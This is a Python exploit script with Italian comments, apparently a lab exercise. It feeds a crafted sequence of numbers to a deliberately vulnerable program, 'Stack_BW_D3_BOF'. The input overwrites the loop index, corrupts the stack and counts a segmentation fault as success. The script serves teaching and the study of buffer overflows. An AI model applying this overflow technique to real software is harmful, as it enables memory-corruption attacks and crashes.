import subprocess
import time

# --- 1. Costruzione del Payload (per Stack_BW_D3_BOF.c) ---
# Questo payload è per il programma *senza* menu

payload = []

# Fase 1: Riempimento (19 volte '1')
# per arrivare alla variabile 'i'
for _ in range(19):
    payload.append("1")

# Fase 2: Dirottamento di 'i'
# Scriviamo '20' in vector[19], che è anche 'i'
payload.append("20")

# Fase 3: L'attacco (500 numeri per corrompere lo stack)
# Il loop ora continuerà da i=21 fino a 500
for _ in range(500):
    payload.append("9999999999")

# Uniamo tutto
payload_string = "\n".join(payload) + "\n"

# --- 2. Esecuzione dell'Exploit ---
programma_vulnerabile = "./Stack_BW_D3_BOF" # Il programma Stack vuln

print(f"--- Avvio di: {programma_vulnerabile} ---")
print(f"--- Invio del payload ({len(payload)} righe) ---")

process = subprocess.Popen(
    [programma_vulnerabile],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

# Invia l'intero payload
try:
    stdout_output, stderr_output = process.communicate(
        input=payload_string, 
        timeout=5
    )
    print("\n--- Output del Programma (stdout) ---")
    print(stdout_output)
    print("\n--- Output degli Errori (stderr) ---")
    print(stderr_output)

except subprocess.TimeoutExpired:
    print("\n--- Programma bloccato (Timeout) ---")
    process.kill()

# --- 3. Controllo del Risultato ---
print("\n--- Risultato dell'Exploit ---")

# Codice -11 = Segmentation Fault (SIGSEGV)
if process.returncode == -11:
    print(f"SUCCESSO! :-)")
    print(f"Il programma è crashato con un Segmentation Fault (Codice: {process.returncode})")
else:
    print(f"(!) Fallito. Il programma è terminato normalmente (Codice: {process.returncode})")